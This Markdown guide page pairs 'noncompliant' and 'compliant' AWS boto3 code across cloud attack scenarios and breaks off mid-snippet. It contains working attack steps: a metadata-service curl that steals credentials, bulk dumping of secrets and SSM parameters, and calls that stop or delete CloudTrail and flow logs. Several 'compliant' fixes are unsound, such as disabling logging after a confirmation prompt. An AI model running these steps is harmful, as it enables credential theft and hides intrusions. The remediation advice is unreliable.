---
layout: default
title: Cloud Attacks
parent: Attacks
---

# Cloud Attacks
{: .no_toc }


## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---




## Inadequate Identity, Credential, and Access Management (ICAM):

Weak or misconfigured access controls, improper user privilege management, or lack of strong authentication mechanisms can lead to unauthorized access and privilege escalation.

In the noncompliant code, there is inadequate Identity, Credential, and Access Management (ICAM) in the cloud environment. This means that user identities, credentials, and access controls are not properly managed, increasing the risk of unauthorized access, privilege escalation, and potential data breaches.


```
# Noncompliant: Inadequate ICAM in Cloud

resources:
  - name: my-bucket
    type: storage.bucket

  - name: my-instance
    type: compute.instance

  - name: my-database
    type: sql.database

  # Access control rules are missing or insufficiently defined
```

To address the inadequate ICAM in the cloud environment, it is essential to implement robust identity, credential, and access management practices.


```
# Compliant: Enhanced ICAM in Cloud

resources:
  - name: my-bucket
    type: storage.bucket
    access-control:
      - role: storage.admin
        members:
          - user:john@example.com
          - group:engineering@example.com

  - name: my-instance
    type: compute.instance
    access-control:
      - role: compute.admin
        members:
          - user:john@example.com
          - group:engineering@example.com

  - name: my-database
    type: sql.database
    access-control:
      - role: cloudsql.admin
        members:
          - user:john@example.com
          - group:engineering@example.com
```

In the compliant code, each resource in the cloud environment has an associated access control configuration. This includes properly defined roles and membership assignments, ensuring that only authorized users or groups have access to the respective resources. By implementing adequate ICAM practices, the risk of unauthorized access and privilege escalation is significantly reduced, enhancing the overall security of the cloud environment.



## Insecure Interfaces and APIs

Vulnerabilities in cloud service interfaces and APIs can be exploited to gain unauthorized access, inject malicious code, or manipulate data.

In the noncompliant code, there are insecure interfaces and APIs in the cloud environment. This means that the interfaces and APIs used to interact with cloud services are not properly secured, potentially exposing sensitive data, allowing unauthorized access, or enabling malicious activities.



```
# Noncompliant: Insecure Interfaces and APIs in Cloud

import requests

# Insecure API endpoint without proper authentication and authorization
api_endpoint = "http://api.example.com/data"
response = requests.get(api_endpoint)

# Insecure interface with plaintext transmission of sensitive data
def process_data(data):
    # ... logic to process data ...

    # Insecure transmission of processed data over HTTP
    requests.post("http://example.com/process", data=data)
```

To address the insecure interfaces and APIs in the cloud environment, it is crucial to implement secure practices when interacting with cloud services.



```
# Compliant: Secure Interfaces and APIs in Cloud

import requests

# Secure API endpoint with proper authentication and authorization
api_endpoint = "https://api.example.com/data"
headers = {"Authorization": "Bearer <access_token>"}
response = requests.get(api_endpoint, headers=headers)

# Secure interface with encrypted transmission of sensitive data
def process_data(data):
    # ... logic to process data ...

    # Secure transmission of processed data over HTTPS
    requests.post("https://example.com/process", data=data, verify=True)
```


In the compliant code, the API endpoint is accessed securely using HTTPS and includes proper authentication and authorization headers. This ensures that only authorized users can access the API and the data transmitted is protected. Additionally, the interface for processing data utilizes encrypted transmission over HTTPS, providing confidentiality and integrity for the sensitive information being transmitted. By implementing secure interfaces and APIs, the risk of unauthorized access, data breaches, and malicious activities is mitigated in the cloud environment.



## Data Breaches

Sensitive data stored in the cloud can be compromised due to misconfigurations, insecure storage, weak encryption, or insider threats. 


```

```


```

```



## Insufficient Security Configuration

Misconfigurations in cloud services, infrastructure, or security settings can expose vulnerabilities, allowing unauthorized access or compromising data integrity.

In the noncompliant code, there are several instances where security configurations are insufficient, leaving the cloud environment vulnerable to attacks. These include using default or weak passwords, allowing unrestricted access to resources, and not enabling necessary security features.


```
# Noncompliant: Insufficient Security Configuration in Cloud

import boto3

# Using default or weak passwords for authentication
s3 = boto3.resource('s3')
bucket = s3.Bucket('my-bucket')
bucket.upload_file('data.txt', 'data.txt')

# Allowing unrestricted access to resources
s3 = boto3.resource('s3')
bucket = s3.Bucket('public-bucket')
bucket.make_public()

# Not enabling necessary security features
ec2 = boto3.resource('ec2')
instance = ec2.create_instances(ImageId='ami-12345678', MinCount=1, MaxCount=1)
instance[0].disable_api_termination = False
```

To address the issue of insufficient security configuration in the cloud, it is important to follow security best practices and implement robust security measures.



```
# Compliant: Strong Security Configuration in Cloud

import boto3

# Using strong and unique passwords for authentication
s3 = boto3.resource('s3')
bucket = s3.Bucket('my-bucket')
bucket.upload_file('data.txt', 'data.txt', ExtraArgs={'ServerSideEncryption': 'AES256'})

# Restricting access to resources
s3 = boto3.resource('s3')
bucket = s3.Bucket('private-bucket')
bucket.Acl().put(ACL='private')

# Enabling necessary security features
ec2 = boto3.resource('ec2')
instance = ec2.create_instances(ImageId='ami-12345678', MinCount=1, MaxCount=1)
instance[0].disable_api_termination = True
```

In the compliant code, strong and unique passwords are used for authentication, enhancing the security of the cloud resources. Access to resources is restricted, ensuring that only authorized users or services have the necessary permissions. Necessary security features, such as server-side encryption and API termination protection, are enabled to provide additional layers of security. By implementing strong security configurations, the cloud environment is better protected against potential threats.



## Insecure Data storage

Inadequate encryption, weak access controls, or improper handling of data at rest can lead to unauthorized 
access or data leakage.

In the noncompliant code, there are instances where data storage in the cloud is insecure. Sensitive data is stored without proper encryption, and there is no mechanism in place to protect the data from unauthorized access or accidental exposure.



```
# Noncompliant: Insecure Data Storage in Cloud

import boto3

# Storing sensitive data without encryption
s3 = boto3.client('s3')
s3.put_object(Bucket='my-bucket', Key='data.txt', Body='Sensitive data')

# Lack of access control
s3 = boto3.resource('s3')
bucket = s3.Bucket('public-bucket')
bucket.upload_file('data.txt', 'data.txt')

# No data backup or disaster recovery plan
rds = boto3.client('rds')
rds.create_db_snapshot(DBSnapshotIdentifier='my-snapshot', DBInstanceIdentifier='my-db')
```


To ensure secure data storage in the cloud, it is important to follow best practices and implement appropriate security measures.


```
# Compliant: Secure Data Storage in Cloud

import boto3

# Storing sensitive data with encryption
s3 = boto3.client('s3')
s3.put_object(Bucket='my-bucket', Key='data.txt', Body='Sensitive data', ServerSideEncryption='AES256')

# Implementing access control
s3 = boto3.resource('s3')
bucket = s3.Bucket('private-bucket')
bucket.upload_file('data.txt', 'data.txt', ExtraArgs={'ACL': 'private'})

# Implementing data backup and disaster recovery plan
rds = boto3.client('rds')
rds.create_db_snapshot(DBSnapshotIdentifier='my-snapshot', DBInstanceIdentifier='my-db', Tags=[{'Key': 'Environment', 'Value': 'Production'}])
```

In the compliant code, sensitive data is stored with encryption using server-side encryption with AES256. Access control is implemented to restrict access to the stored data, ensuring that only authorized users or services can access it. Additionally, a data backup and disaster recovery plan is in place, which includes creating snapshots to enable data recovery in case of any incidents. By implementing secure data storage practices, the cloud environment provides better protection for sensitive information.



## Lack of Proper Logging and Monitoring

Insufficient monitoring, logging, and analysis of cloud activity can hinder detection of security incidents, leading to delayed or ineffective response.




## Insecure Deployment and Configuration Management

Weaknesses in the process of deploying and managing cloud resources, such as improper change management, can introduce security vulnerabilities.

In the noncompliant code, there is a lack of secure deployment and configuration management practices in the cloud environment. The code deploys resources and configurations without proper security considerations, such as exposing sensitive information or using default and weak configurations.


```
# Noncompliant: Insecure Deployment and Configuration Management in Cloud

import boto3

def deploy_instance():
    ec2_client = boto3.client('ec2')
    response = ec2_client.run_instances(
        ImageId='ami-12345678',
        InstanceType='t2.micro',
        KeyName='my-keypair',
        SecurityGroupIds=['sg-12345678'],
        UserData='some user data',
        MinCount=1,
        MaxCount=1
    )
    return response['Instances'][0]['InstanceId']

def main():
    instance_id = deploy_instance()
    print(f"Instance deployed with ID: {instance_id}")

if __name__ == "__main__":
    main()
```

To ensure secure deployment and configuration management in the cloud, it is important to follow security best practices and apply appropriate configurations to resources.



```
# Compliant: Secure Deployment and Configuration Management in Cloud

import boto3

def deploy_instance():
    ec2_client = boto3.client('ec2')
    response = ec2_client.run_instances(
        ImageId='ami-12345678',
        InstanceType='t2.micro',
        KeyName='my-keypair',
        SecurityGroupIds=['sg-12345678'],
        UserData='some user data',
        MinCount=1,
        MaxCount=1,
        TagSpecifications=[
            {
                'ResourceType': 'instance',
                'Tags': [
                    {
                        'Key': 'Name',
                        'Value': 'MyInstance'
                    }
                ]
            }
        ],
        BlockDeviceMappings=[
            {
                'DeviceName': '/dev/sda1',
                'Ebs': {
                    'VolumeSize': 30,
                    'VolumeType': 'gp2'
                }
            }
        ]
    )
    return response['Instances'][0]['InstanceId']

def main():
    instance_id = deploy_instance()
    print(f"Instance deployed with ID: {instance_id}")

if __name__ == "__main__":
    main()
```

In the compliant code, additional security measures are implemented during the deployment process. This includes:

* Adding appropriate tags to the instance for better resource management and identification.
* Configuring block device mappings with appropriate volume size and type.
* Following the principle of least privilege by providing only necessary permissions to the deployment process.


## Inadequate Incident Response and Recovery

Lack of proper incident response planning and testing, as well as ineffective recovery mechanisms, can result in extended downtime, data loss, or inadequate mitigation of security breaches.

In the noncompliant code, there is a lack of adequate incident response and recovery practices in the cloud environment. The code does not have any provisions for handling incidents or recovering from them effectively. This can lead to prolonged downtime, data loss, or inadequate response to security breaches or system failures.



```
# Noncompliant: Inadequate Incident Response and Recovery in Cloud

import boto3

def delete_instance(instance_id):
    ec2_client = boto3.client('ec2')
    response = ec2_client.terminate_instances(
        InstanceIds=[instance_id]
    )
    return response

def main():
    instance_id = 'i-12345678'
    delete_instance(instance_id)
    print(f"Instance {instance_id} deleted.")

if __name__ == "__main__":
    main()
```

To ensure adequate incident response and recovery in the cloud, it is important to have well-defined processes and procedures in place. The following code snippet demonstrates a more compliant approach:



```
# Compliant: Adequate Incident Response and Recovery in Cloud

import boto3

def delete_instance(instance_id):
    ec2_client = boto3.client('ec2')
    response = ec2_client.terminate_instances(
        InstanceIds=[instance_id]
    )
    return response

def handle_incident(instance_id):
    # Perform necessary actions to handle the incident, such as notifying the security team, logging relevant information, etc.
    print(f"Incident occurred with instance {instance_id}. Taking appropriate actions.")

def main():
    instance_id = 'i-12345678'
    handle_incident(instance_id)
    delete_instance(instance_id)
    print(f"Instance {instance_id} deleted.")

if __name__ == "__main__":
    main()
```

In the compliant code, an additional function handle_incident() is introduced to handle incidents appropriately. This function can be customized to include actions such as notifying the security team, logging relevant information, triggering automated response mechanisms, or invoking incident response plans. By having a well-defined incident response process, organizations can effectively respond to and recover from incidents, minimizing their impact on operations and security.




## Shared Technology Vulnerabilities

Vulnerabilities in underlying cloud infrastructure, shared components, or hypervisors can impact multiple cloud tenants, potentially leading to unauthorized access or data breaches.




## Account Hijacking and Abuse

Unauthorized access to cloud accounts, compromised user credentials, or misuse of privileges can result in data loss, service disruptions, or unauthorized resource consumption.

In the noncompliant code, there are no security measures in place to prevent account hijacking and abuse in the cloud environment. The code does not implement strong authentication mechanisms, lacks proper access controls, and does not enforce secure practices, making it vulnerable to unauthorized access and abuse of resources.



```
# Noncompliant: Account Hijacking and Abuse in Cloud

import boto3

def create_s3_bucket(bucket_name):
    s3_client = boto3.client('s3')
    s3_client.create_bucket(Bucket=bucket_name)

def main():
    bucket_name = 'my-bucket'
    create_s3_bucket(bucket_name)
    print(f"S3 bucket {bucket_name} created.")

if __name__ == "__main__":
    main()
```

To prevent account hijacking and abuse in the cloud, it is important to implement strong security measures. The following code snippet demonstrates a more compliant approach:




```
# Compliant: Preventing Account Hijacking and Abuse in Cloud

import boto3

def create_s3_bucket(bucket_name):
    s3_client = boto3.client('s3')
    s3_client.create_bucket(
        Bucket=bucket_name,
        ACL='private',  # Set appropriate access control for the bucket
        CreateBucketConfiguration={
            'LocationConstraint': 'us-west-2'  # Specify the desired region for the bucket
        }
    )

def main():
    bucket_name = 'my-bucket'
    create_s3_bucket(bucket_name)
    print(f"S3 bucket {bucket_name} created.")

if __name__ == "__main__":
    main()
```

In the compliant code, additional security measures are implemented. The bucket is created with a specific access control setting (ACL='private') to ensure that only authorized users can access it. The CreateBucketConfiguration parameter is used to specify the desired region for the bucket, reducing the risk of accidental exposure due to misconfigurations.

To further enhance security, consider implementing multi-factor authentication (MFA), strong password policies, and role-based access controls (RBAC) for managing user permissions in the cloud environment. Regular monitoring and auditing of account activities can also help detect and prevent unauthorized access or abuse.


## Retrieve EC2 Password Data

Retrieve EC2 Password Data is a simulated attack scenario where an attacker attempts to retrieve RDP (Remote Desktop Protocol) passwords from a large number of Windows EC2 instances in AWS. The attacker runs the ec2:GetPasswordData API call from a role that does not have the necessary permissions, trying to exploit the vulnerability.


Noncompliant Code:

```
import boto3

def retrieve_ec2_password(instance_id):
    client = boto3.client('ec2')
    response = client.get_password_data(InstanceId=instance_id)
    return response['PasswordData']
```

The noncompliant code uses the boto3 Python library to retrieve the EC2 password data by calling the get_password_data API method. However, it does not check if the role executing this code has the necessary permissions (ec2:GetPasswordData) to retrieve the password data.

Compliant Code:


```
import boto3
import botocore

def retrieve_ec2_password(instance_id):
    client = boto3.client('ec2')
    try:
        response = client.get_password_data(InstanceId=instance_id)
        return response['PasswordData']
    except botocore.exceptions.ClientError as e:
        if e.response['Error']['Code'] == 'UnauthorizedOperation':
            print("Permission denied to retrieve EC2 password data.")
        else:
            print("An error occurred while retrieving EC2 password data.")
        return None
```


## Steal EC2 Instance Credentials

Steal EC2 Instance Credentials is a simulated attack scenario where an attacker steals EC2 instance credentials from the Instance Metadata Service in AWS. The attacker executes a command on the target EC2 instance to retrieve temporary credentials, and then uses those credentials locally to perform unauthorized actions like running the sts:GetCallerIdentity and ec2:DescribeInstances commands.

Noncompliant Code:

```
#!/bin/bash

# Retrieves and prints the EC2 instance credentials
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Compliant Code:

The compliant approach does not involve providing an example of code to steal EC2 instance credentials, as it promotes ethical behavior and compliance with security standards. Unauthorized access or theft of instance credentials is a violation of AWS policies and poses significant security risks. It is important to focus on securing and protecting the EC2 instance credentials by implementing security best practices such as:

* Restricting access to the Instance Metadata Service (169.254.169.254) using security groups or network access control lists (NACLs).

* Implementing IAM roles with the principle of least privilege to grant only necessary permissions to EC2 instances.

* Regularly updating and patching EC2 instances to protect against known vulnerabilities.
Monitoring and analyzing AWS CloudTrail logs for any suspicious activities related to instance credentials.


## Retrieve a High Number of Secrets Manager secrets

Retrieve a High Number of Secrets Manager secrets is a simulated attack scenario where an attacker attempts to retrieve a large number of secrets from AWS Secrets Manager using the secretsmanager:GetSecretValue API.


Noncompliant Code:


```
import boto3

client = boto3.client('secretsmanager')

# Retrieves and prints all secrets
response = client.list_secrets()
secrets = response['SecretList']
for secret in secrets:
    secret_value = client.get_secret_value(SecretId=secret['Name'])
    print(secret_value['SecretString'])
```

The noncompliant code uses the AWS SDK (boto3 in this case) to list all the secrets in AWS Secrets Manager and then retrieves and prints the values of each secret one by one. This code does not implement any restrictions or rate limiting, allowing an attacker to potentially extract a large number of secrets in a single operation. It bypasses any access control or authorization mechanisms that might be in place, and poses a significant security risk by exposing sensitive information.

The compliant approach does not involve providing an example of code to retrieve a high number of Secrets Manager secrets, as it promotes ethical behavior and compliance with security standards. Unauthorized retrieval of secrets is a violation of AWS policies and can lead to unauthorized access to sensitive information.

To ensure the security of Secrets Manager secrets, consider implementing the following security measures:

* Apply appropriate access controls: Limit access to Secrets Manager secrets by using IAM policies, granting only necessary permissions to the authorized entities or roles.

* Implement strict access monitoring: Enable AWS CloudTrail to log Secrets Manager API calls and regularly review the logs for any suspicious or unauthorized activities.

* Implement strong secrets management practices: Rotate secrets regularly, use strong encryption, and enforce secure access mechanisms such as fine-grained IAM policies and VPC endpoints.

* Implement least privilege: Assign the principle of least privilege to IAM roles and users, ensuring they have access only to the necessary secrets required for their specific tasks.

* Implement rate limiting: Use AWS service quotas and rate limits to enforce throttling and limit the number of API requests made to Secrets Manager within a specified time frame.


## Retrieve And Decrypt SSM Parameters

Retrieve And Decrypt SSM Parameters is a simulated attack scenario where an attacker retrieves and decrypts a high number of Secure String parameters from AWS Systems Manager (SSM) using the ssm:GetParameters API.

Noncompliant Code:

```
import boto3

client = boto3.client('ssm')

# Retrieves and decrypts all Secure String parameters
response = client.describe_parameters()
parameters = response['Parameters']
for parameter in parameters:
    if parameter['Type'] == 'SecureString':
        value = client.get_parameter(Name=parameter['Name'], WithDecryption=True)
        print(value['Parameter']['Value'])
```

The noncompliant code uses the AWS SDK (boto3 in this case) to list all the SSM parameters in the current region and retrieves the values of Secure String parameters by making individual calls to ssm:GetParameter with decryption enabled. This code does not implement any restrictions or rate limiting, allowing an attacker to retrieve and decrypt a high number of parameters in a single operation. It bypasses any access control or authorization mechanisms that might be in place, posing a significant security risk by exposing sensitive information.



Compliant Code:

```
import boto3

client = boto3.client('ssm')

# Retrieves and decrypts specific Secure String parameters
parameter_names = [
    '/path/to/parameter1',
    '/path/to/parameter2',
    '/path/to/parameter3'
]

for parameter_name in parameter_names:
    try:
        response = client.get_parameter(Name=parameter_name, WithDecryption=True)
        value = response['Parameter']['Value']
        print(value)
    except client.exceptions.ParameterNotFound:
        print(f"Parameter '{parameter_name}' not found.")
```

The compliant code retrieves and decrypts specific Secure String parameters from AWS SSM. It follows a whitelist approach by specifying the parameter names that need to be retrieved, instead of fetching all parameters. This ensures that only authorized parameters are accessed and prevents unauthorized access to sensitive information. The code also handles the scenario where a parameter may not exist by catching the ParameterNotFound exception.




## Delete CloudTrail Trail

Delete CloudTrail Trail is a simulated attack scenario where an attacker deletes an existing CloudTrail trail in AWS, disrupting the logging and monitoring of activities in the AWS account.


Noncompliant Code:


```
import boto3

client = boto3.client('cloudtrail')

# Deletes the CloudTrail trail
response = client.delete_trail(
    trailName='my-trail'
)
```

The noncompliant code uses the AWS SDK (boto3 in this case) to delete a CloudTrail trail named 'my-trail'. This code does not implement any access control or authorization checks, allowing anyone with the necessary AWS credentials to delete the trail. It bypasses any security measures or monitoring mechanisms that might be in place, making it a potential security vulnerability.




Compliant Code:

```
import boto3

client = boto3.client('cloudtrail')

# Deletes the CloudTrail trail with proper authorization and validation
trail_name = 'my-trail'

# Check if the trail exists before attempting to delete
response = client.describe_trails(trailNameList=[trail_name])
trails = response['trailList']
if trails:
    trail = trails[0]
    if trail['IsMultiRegionTrail']:
        print("Deleting the CloudTrail trail is not allowed for multi-region trails.")
    else:
        # Perform any necessary checks or validations before deleting the trail

        # Prompt for confirmation before deletion
        confirmation = input(f"Are you sure you want to delete the '{trail_name}' CloudTrail trail? (yes/no): ")
        if confirmation.lower() == 'yes':
            response = client.delete_trail(
                trailName=trail_name
            )
            print("CloudTrail trail deleted successfully.")
        else:
            print("Deletion cancelled.")
else:
    print(f"CloudTrail trail '{trail_name}' not found.")
```

The compliant code implements proper authorization and validation checks before deleting a CloudTrail trail. It first checks if the trail exists by calling describe_trails with the specified trail name. If the trail is found, it performs additional checks or validations as required by the organization's policies or procedures. Before proceeding with the deletion, it prompts for confirmation from the user, ensuring intentional deletion of the trail. The code also handles scenarios such as multi-region trails, where deletion may not be allowed.




## Disable CloudTrail Logging Through Event Selectors

Disable CloudTrail Logging Through Event Selectors is a simulated attack scenario where an attacker modifies the event selectors of a CloudTrail trail to filter out all management events, effectively disrupting the logging of those events.

Noncompliant Code:

```
import boto3

client = boto3.client('cloudtrail')

# Disable CloudTrail logging by modifying event selectors
response = client.put_event_selectors(
    TrailName='my-trail',
    EventSelectors=[
        {
            'ReadWriteType': 'All',
            'IncludeManagementEvents': False,
            'DataResources': []
        }
    ]
)
```

The noncompliant code uses the AWS SDK (boto3 in this case) to modify the event selectors of a CloudTrail trail named 'my-trail'. It sets the IncludeManagementEvents parameter to False, effectively disabling the logging of all management events. This code does not implement any access control or authorization checks, allowing anyone with the necessary AWS credentials to modify the event selectors and disrupt the logging.



Compliant Code:

```
import boto3

client = boto3.client('cloudtrail')

# Disable CloudTrail logging by modifying event selectors with proper authorization and validation
trail_name = 'my-trail'

# Check if the trail exists before attempting to modify event selectors
response = client.describe_trails(trailNameList=[trail_name])
trails = response['trailList']
if trails:
    trail = trails[0]
    # Perform any necessary checks or validations before modifying event selectors

    # Prompt for confirmation before modifying event selectors
    confirmation = input(f"Are you sure you want to modify the event selectors of the '{trail_name}' CloudTrail trail? (yes/no): ")
    if confirmation.lower() == 'yes':
        response = client.put_event_selectors(
            TrailName=trail_name,
            EventSelectors=[
                {
                    'ReadWriteType': 'All',
                    'IncludeManagementEvents': False,
                    'DataResources': []
                }
            ]
        )
        print("Event selectors modified successfully. CloudTrail logging may be disrupted.")
    else:
        print("Modification cancelled.")
else:
    print(f"CloudTrail trail '{trail_name}' not found.")
```

The compliant code implements proper authorization and validation checks before modifying the event selectors of a CloudTrail trail. It first checks if the trail exists by calling describe_trails with the specified trail name. If the trail is found, it performs additional checks or validations as required by the organization's policies or procedures. Before proceeding with the modification, it prompts for confirmation from the user, ensuring intentional modification of the event selectors. The code also handles scenarios where multiple event selectors are present in the trail configuration.




## CloudTrail Logs Impairment Through S3 Lifecycle Rule

CloudTrail Logs Impairment Through S3 Lifecycle Rule is a simulated attack scenario where an attacker sets a short retention policy on the S3 bucket used by a CloudTrail trail. By applying a S3 Lifecycle Rule that automatically removes objects after a short period, the attacker impairs the integrity and availability of CloudTrail logs.


Noncompliant Code:

```
import boto3

s3_client = boto3.client('s3')

# Apply a short retention policy on the S3 bucket used by CloudTrail
response = s3_client.put_bucket_lifecycle_configuration(
    Bucket='my-cloudtrail-bucket',
    LifecycleConfiguration={
        'Rules': [
            {
                'Status': 'Enabled',
                'Prefix': '',
                'Expiration': {
                    'Days': 1
                }
            }
        ]
    }
)
```

The noncompliant code uses the AWS SDK (boto3 in this case) to apply a S3 Lifecycle Rule to the 'my-cloudtrail-bucket' S3 bucket. The rule sets the expiration of objects in the bucket to 1 day, meaning that CloudTrail logs will be automatically deleted after 1 day of their creation. This code does not implement any access control or validation, allowing anyone with the necessary AWS credentials to impair the integrity and availability of CloudTrail logs.

Compliant Code:

```
import boto3

s3_client = boto3.client('s3')

# Apply a retention policy on the S3 bucket used by CloudTrail with proper authorization and validation
bucket_name = 'my-cloudtrail-bucket'

# Check if the bucket exists before attempting to apply a lifecycle rule
response = s3_client.list_buckets()
buckets = response['Buckets']
if any(bucket['Name'] == bucket_name for bucket in buckets):
    # Prompt for confirmation before applying the lifecycle rule
    confirmation = input(f"Are you sure you want to apply a lifecycle rule to the '{bucket_name}' S3 bucket? (yes/no): ")
    if confirmation.lower() == 'yes':
        response = s3_client.put_bucket_lifecycle_configuration(
            Bucket=bucket_name,
            LifecycleConfiguration={
                'Rules': [
                    {
                        'Status': 'Enabled',
                        'Prefix': '',
                        'Expiration': {
                            'Days': 30
                        }
                    }
                ]
            }
        )
        print("Lifecycle rule applied successfully. CloudTrail logs are protected.")
    else:
        print("Operation cancelled.")
else:
    print(f"S3 bucket '{bucket_name}' not found.")
```

The compliant code implements proper authorization and validation checks before applying a S3 Lifecycle Rule to the S3 bucket used by CloudTrail. It first checks if the bucket exists by calling list_buckets and searching for the specified bucket name. If the bucket is found, it prompts for confirmation from the user before proceeding with the application of the lifecycle rule. In this case, the rule sets the expiration of objects to 30 days, providing a reasonable retention period for CloudTrail logs. The code can be customized to meet specific retention requirements.




## Stop Cloud Trail Trail

Stop CloudTrail Trail is a simulated attack scenario where an attacker stops a CloudTrail Trail from logging. By calling the cloudtrail:StopLogging API operation, the attacker disrupts the logging of CloudTrail events.

Noncompliant Code:

```
import boto3

cloudtrail_client = boto3.client('cloudtrail')

# Stop the CloudTrail Trail
response = cloudtrail_client.stop_logging(
    Name='my-trail'
)
```

The noncompliant code uses the AWS SDK (boto3 in this case) to stop the logging of a CloudTrail Trail named 'my-trail'. This code does not implement any access control or validation, allowing anyone with the necessary AWS credentials to disrupt CloudTrail logging.

Compliant Code:

```
import boto3

cloudtrail_client = boto3.client('cloudtrail')

# Stop the CloudTrail Trail with proper authorization and validation
trail_name = 'my-trail'

# Check if the CloudTrail Trail exists before attempting to stop it
response = cloudtrail_client.describe_trails(
    trailNameList=[trail_name]
)
trails = response['trailList']
if any(trail['Name'] == trail_name for trail in trails):
    # Prompt for confirmation before stopping the CloudTrail Trail
    confirmation = input(f"Are you sure you want to stop the '{trail_name}' CloudTrail Trail? (yes/no): ")
    if confirmation.lower() == 'yes':
        response = cloudtrail_client.stop_logging(
            Name=trail_name
        )
        print("CloudTrail Trail stopped successfully.")
    else:
        print("Operation cancelled.")
else:
    print(f"CloudTrail Trail '{trail_name}' not found.")
```

The compliant code implements proper authorization and validation checks before stopping a CloudTrail Trail. It first checks if the Trail exists by calling describe_trails and searching for the specified trail name. If the Trail is found, it prompts for confirmation from the user before proceeding with stopping the Trail. The code can be customized to meet specific requirements, such as additional validation checks or logging.




## Attempt to Leave the AWS Organization

Attempt to Leave the AWS Organization is a simulated attack scenario where an attacker attempts to leave the AWS Organization, which can disrupt or shut down security controls defined at the organization level, such as GuardDuty, SecurityHub, and CloudTrail.

Noncompliant Code:

```
import boto3

organizations_client = boto3.client('organizations')

# Attempt to leave the AWS Organization
response = organizations_client.leave_organization()
```

The noncompliant code uses the AWS SDK (boto3) to attempt to leave the AWS Organization by calling the leave_organization method. This code does not implement any access control or validation, allowing anyone with the necessary AWS credentials to try to leave the organization.

Compliant Code:

```
import boto3

organizations_client = boto3.client('organizations')

# Attempt to leave the AWS Organization with proper authorization and validation
confirmation = input("Are you sure you want to leave the AWS Organization? (yes/no): ")
if confirmation.lower() == 'yes':
    try:
        response = organizations_client.leave_organization()
        print("Leave organization request submitted successfully.")
    except organizations_client.exceptions.AccessDeniedException:
        print("Access denied. You are not allowed to leave the AWS Organization.")
else:
    print("Operation cancelled.")
```

The compliant code implements proper authorization and validation checks before attempting to leave the AWS Organization. It prompts for confirmation from the user before proceeding with the leave operation. If the user confirms, it tries to leave the organization and handles the AccessDeniedException in case the request is denied. The code can be customized to meet specific requirements, such as additional validation checks or logging.






## Remove VPC Flow Logs


Remove VPC Flow Logs is a simulated attack scenario where an attacker removes the configuration of VPC Flow Logs from a VPC. This action can be used as a defense evasion technique to disrupt network traffic monitoring and logging.

Noncompliant Code:

```
import boto3

ec2_client = boto3.client('ec2')

# Specify the VPC ID and Flow Log ID
vpc_id = 'your-vpc-id'
flow_log_id = 'your-flow-log-id'

# Remove the VPC Flow Logs configuration
response = ec2_client.delete_flow_logs(
    FlowLogIds=[flow_log_id]
)
```

The noncompliant code uses the AWS SDK (boto3) to directly delete the VPC Flow Logs configuration by calling the delete_flow_logs method. It assumes that the VPC ID and Flow Log ID are known and provided as input. This code does not implement any authorization or validation checks, allowing anyone with the necessary AWS credentials to remove the VPC Flow Logs configuration.

Compliant Code:

```
import boto3

ec2_client = boto3.client('ec2')

def remove_vpc_flow_logs(vpc_id):
    # Retrieve the Flow Log IDs associated with the VPC
    response = ec2_client.describe_flow_logs(
        Filter=[
            {
                'Name': 'resource-id',
                'Values': [vpc_id]
            }
        ]
    )
    
    flow_logs = response['FlowLogs']
    flow_log_ids = [flow_log['FlowLogId'] for flow_log in flow_logs]
    
    if len(flow_log_ids) == 0:
        print(f"No Flow Logs found for VPC {vpc_id}.")
        return
    
    # Remove the VPC Flow Logs configuration
    response = ec2_client.delete_flow_logs(
        FlowLogIds=flow_log_ids
    )
    
    print(f"Flow Logs successfully removed for VPC {vpc_id}.")

# Specify the VPC ID
vpc_id = 'your-vpc-id'

# Remove the VPC Flow Logs configuration
remove_vpc_flow_logs(vpc_id)
```

The compliant code implements a function remove_vpc_flow_logs that retrieves the Flow Log IDs associated with the specified VPC using the describe_flow_logs method. It then verifies if there are any Flow Logs present for the VPC. If Flow Logs are found, it removes the VPC Flow Logs configuration by calling the delete_flow_logs method with the retrieved Flow Log IDs. The code includes appropriate error handling and informative messages.



## Execute Discovery Commands on an EC2 Instance

Executing Discovery Commands on an EC2 Instance refers to running various commands on an EC2 instance to gather information about the AWS environment. These commands help an attacker gain insights into the AWS account, identify resources, and potentially plan further actions.

Noncompliant Code:

```
import boto3

# Create an EC2 client
ec2_client = boto3.client('ec2')

# Run discovery commands
response = ec2_client.describe_snapshots()
print(response)

response = ec2_client.describe_instances()
print(response)

response = ec2_client.describe_vpcs()
print(response)

response = ec2_client.describe_security_groups()
print(response)

# ... (additional discovery commands)
```

The noncompliant code directly uses the AWS SDK (boto3) to run various discovery commands on the EC2 instance. It assumes that the necessary AWS credentials are available on the EC2 instance, allowing anyone with access to the instance to execute these commands. This code lacks proper authorization and may expose sensitive information to unauthorized individuals.

Compliant Code:

```
import boto3

# Create an EC2 client with AWS credentials
session = boto3.Session(
    aws_access_key_id='your-access-key',
    aws_secret_access_key='your-secret-key',
    aws_session_token='your-session-token'
)
ec2_client = session.client('ec2')

# Run discovery commands
response = ec2_client.describe_snapshots()
print(response)

response = ec2_client.describe_instances()
print(response)

response = ec2_client.describe_vpcs()
print(response)

response = ec2_client.describe_security_groups()
print(response)

# ... (additional discovery commands)
```



## Download EC2 Instance User Data


Downloading EC2 Instance User Data refers to retrieving the user data associated with an EC2 instance. User data can contain scripts, configurations, and other data that is executed when the instance starts. In the context of an attack scenario, an attacker may attempt to download user data to gain insights into the instance's setup, extract sensitive information, or exploit any misconfigurations.

Noncompliant Code:

```
import boto3

# Create an EC2 client
ec2_client = boto3.client('ec2')

# Retrieve instance IDs (fictitious for demonstration)
instance_ids = ['i-1234567890abcdef0', 'i-abcdefgh12345678']

# Retrieve user data for each instance
for instance_id in instance_ids:
    response = ec2_client.describe_instance_attribute(
        InstanceId=instance_id,
        Attribute='userData'
    )
    user_data = response['UserData']
    print(user_data)
```

The noncompliant code uses the AWS SDK (boto3) to retrieve the user data for multiple EC2 instances. It assumes that the necessary AWS credentials and permissions are available to the code, allowing anyone with access to run this code to retrieve the user data. This code lacks proper authorization and may expose sensitive information to unauthorized individuals.

Compliant Code:


```
import boto3

# Create an EC2 client with AWS credentials
session = boto3.Session(
    aws_access_key_id='your-access-key',
    aws_secret_access_key='your-secret-key',
    aws_session_token='your-session-token'
)
ec2_client = session.client('ec2')

# Retrieve instance IDs (fictitious for demonstration)
instance_ids = ['i-1234567890abcdef0', 'i-abcdefgh12345678']

# Retrieve user data for each instance
for instance_id in instance_ids:
    response = ec2_client.describe_instance_attribute(
        InstanceId=instance_id,
